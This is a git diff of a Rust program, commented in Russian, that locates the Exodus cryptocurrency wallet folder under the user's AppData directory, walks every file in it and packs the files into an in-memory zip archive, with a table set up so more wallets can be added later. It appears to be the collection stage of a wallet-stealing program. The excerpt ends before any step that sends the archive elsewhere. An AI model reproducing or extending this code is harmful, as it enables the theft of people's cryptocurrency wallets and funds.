@@ -9,20 +9,20 @@ use zip::CompressionMethod::Deflated;
 use walkdir::WalkDir;
 
 fn main() {
-    let appdata = std::env::var("APPDATA").unwrap();
-    let exodus_path = PathBuf::from(&appdata).join("Exodus/exodus.wallet");
-    let mut wallets_path = HashMap::new();
+    let appdata = std::env::var("APPDATA").unwrap(); //Ищем в окружении папку AppData
+    let exodus_path = PathBuf::from(&appdata).join("Exodus/exodus.wallet"); //Ищем папку exodus.wallet по заданному пути
+    let mut wallets_path = HashMap::new(); //Для будущих нововведений добавил хэштаблицу
     wallets_path.insert("Exodus", exodus_path);
 
-    let mut buf = Cursor::new(Vec::new()); // Создаем буфер в памяти
-    let options = FileOptions::default()
-        .compression_method(Deflated)
-        .unix_permissions(0o755);
+    let mut buf = Cursor::new(Vec::new()); //Создаем буфер в памяти
+    let options = FileOptions::default() //Опции файлов и архивов
+        .compression_method(Deflated);
+
 
     {
-        let mut zip = ZipWriter::new(&mut buf); // Создаем архив в буфере памяти
+        let mut zip = ZipWriter::new(&mut buf); //Создаем архив в буфере памяти
 
-        for entry in &wallets_path {
+        for entry in &wallets_path { //Перебираем все файлы в заданной папке и добавляем их в наш архив
             for file_entry in WalkDir::new(&entry.1).into_iter().filter_map(|e| e.ok()) {
                 let path = file_entry.path();
                 if path.is_file() {
